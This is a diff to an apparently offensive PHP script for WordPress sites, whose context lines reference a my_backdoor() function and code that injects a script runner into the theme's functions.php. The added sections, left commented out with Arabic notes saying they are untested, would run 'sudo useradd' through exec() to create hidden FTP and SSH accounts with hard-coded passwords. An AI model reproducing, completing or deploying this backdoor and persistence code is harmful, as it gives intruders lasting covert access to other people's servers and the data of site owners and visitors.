@@ -47,7 +47,7 @@ function my_backdoor()
 }
 
 ##------------------------------------------------##
-## 04 # Add Script Runner To Theme function.php
+## 04 # Add Script Runner To Theme functions.php
 ##------------------------------------------------##
 // Get file directory
 $file = get_stylesheet_directory() . '/functions.php';
@@ -77,3 +77,43 @@ if (preg_match_all($pattern, $contents, $matches)) {
   // Write the modified contents back to the file
   file_put_contents($file, $contents);
 }
+
+##------------------------------------------------##
+## 05 # Craete FTP Account
+##------------------------------------------------##
+# الكود دا كله لسا متراجعش عليه ومعرفش شغال ولا لا
+
+// // FTP account details
+// $username = 'newuser';
+// $password = 'newpassword';
+
+// // Execute the command to create an FTP user (Linux example)
+// $command = 'sudo useradd -m ' . $username . ' -p $(openssl passwd -1 ' . $password . ')';
+// exec($command, $output, $returnCode);
+
+// if ($returnCode === 0) {
+//   echo 'FTP account created successfully.';
+// } else {
+//   echo 'Failed to create FTP account.';
+//   print_r($output); // Output any error messages or details
+// }
+
+##------------------------------------------------##
+## 06 # Create SSH Access
+##------------------------------------------------##
+# الكود دا كله لسا متراجعش عليه ومعرفش شغال ولا لا
+
+// // SSH user details
+// $username = 'newuser';
+// $password = 'newpassword';
+
+// // Execute the command to create an SSH user (Linux example)
+// $command = 'sudo useradd ' . $username . ' -m -p $(openssl passwd -1 ' . $password . ')';
+// exec($command, $output, $returnCode);
+
+// if ($returnCode === 0) {
+//     echo 'SSH user created successfully.';
+// } else {
+//     echo 'Failed to create SSH user.';
+//     print_r($output); // Output any error messages or details
+// }
